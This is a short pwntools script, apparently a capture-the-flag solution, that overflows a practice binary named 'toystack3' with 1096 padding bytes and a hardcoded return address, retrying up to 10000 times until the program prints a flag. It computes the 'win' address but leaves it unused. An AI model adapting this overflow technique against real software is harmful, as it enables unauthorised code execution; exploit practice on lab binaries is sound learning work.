from pwn import *

# Load the binary
exe = ELF('./toystack3')
win_address = exe.symbols['win']
lower_bytes = win_address & 0xFFFF 


for i in range(10000):  
    

    payload = b'A' * 1096
    payload += p32(0x5661fa28) 
    # Open process for each brute-force attempt
    io = process(exe.path)

    try:
        # Receive prompt from program
        io.recvuntil(b'We will now read in some bytes!', timeout=5)
        
        io.sendline(payload)

        # Wait for the program to output "flag:"
        flag = io.recvuntil(b'flag:', timeout=5)  
        if b'flag:' in flag:  
            flag += io.recvline()  
            print(f"Success! Flag found: {flag.decode('utf-8')}")
            break 

    except Exception as e:
        print(f"Error during execution: {e}")
    
    finally:
        io.close()  # Close the process and continue the loop
